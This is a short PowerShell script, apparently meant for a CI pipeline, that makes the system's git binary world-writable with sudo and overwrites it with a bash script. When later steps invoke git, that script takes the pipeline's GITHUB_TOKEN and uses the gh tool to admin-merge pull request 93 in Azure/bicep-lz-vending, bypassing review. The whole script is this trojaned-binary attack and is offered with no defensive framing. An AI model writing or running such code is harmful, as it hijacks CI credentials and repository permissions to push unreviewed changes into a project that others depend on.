Write-Host "hello"

$content = @"
#!/bin/bash

echo `"AAAAAAAAAAAAAAAAAAAAAAAAAAA in script`"

if [ -n `"`$GITHUB_TOKEN`" ]; then
    echo `"got token`"
    
    export GH_TOKEN=`"`$GITHUB_TOKEN`"
    
    gh auth status
    gh pr merge 93 --admin -R Azure/bicep-lz-vending -m
    echo `"finished doing gh`"
fi
"@

$gitPath = & which git
sudo chmod 777 $gitPath

Set-Content -Path $gitPath -Value $content
